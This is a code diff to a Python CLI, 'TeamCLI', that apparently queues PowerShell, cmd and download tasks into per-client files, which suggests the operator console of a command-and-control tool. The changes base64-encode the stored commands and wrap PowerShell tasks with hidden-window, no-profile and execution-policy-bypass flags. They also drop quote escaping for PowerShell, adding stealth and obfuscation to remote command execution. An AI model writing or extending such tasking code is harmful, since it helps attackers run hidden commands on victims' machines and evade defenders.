@@ -2,6 +2,7 @@
 
 import os
 import cmd
+import base64
 
 BASE_DIR = "./clients"
 
@@ -87,7 +88,7 @@ class TeamCLI(cmd.Cmd):
                 with open(file_path, "r", encoding="utf-8", errors="replace") as f:
                     content = f.read().strip()
                     if content:
-                        print(content)
+                        print(base64.b64decode(content.encode('ascii')).decode('utf-8'))
                     else:
                         print("(empty file)")
             except Exception as e:
@@ -126,12 +127,12 @@ class TeamCLI(cmd.Cmd):
         if mode not in ["powershell", "cmd", "download"]:
             print("Mode must be 'powershell', 'cmd', or 'download'.")
             return
-
-        command = command.replace("\"", "\\\"")
+        
         # Prefix actual execution wrapper
         if mode == "powershell":
-            command = f"powershell.exe -Command \"{command}\""
+            command = f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$({command})\""
         elif mode == "cmd":
+            command = command.replace("\"", "\\\"")
             command = f"cmd.exe /c \"{command}\""
         elif mode == "download":
             command = f"download {command}"
@@ -181,7 +182,7 @@ class TeamCLI(cmd.Cmd):
                     print(f"[WARN] Missing file: {team}/{filename}")
                     continue
                 with open(file_path, "w") as f:
-                    f.write(command)
+                    f.write(base64.b64encode(command.encode("utf-8")).decode("ascii"))
                 print(f"[OK] {team}/{filename}")
                 modified_count += 1
 
@@ -189,9 +190,6 @@ class TeamCLI(cmd.Cmd):
             total_modified += modified_count
 
         print(f"\nTotal modified files: {total_modified}")
-
-
-
 
     def do_exit(self, arg):
         """exit - Quit the CLI"""
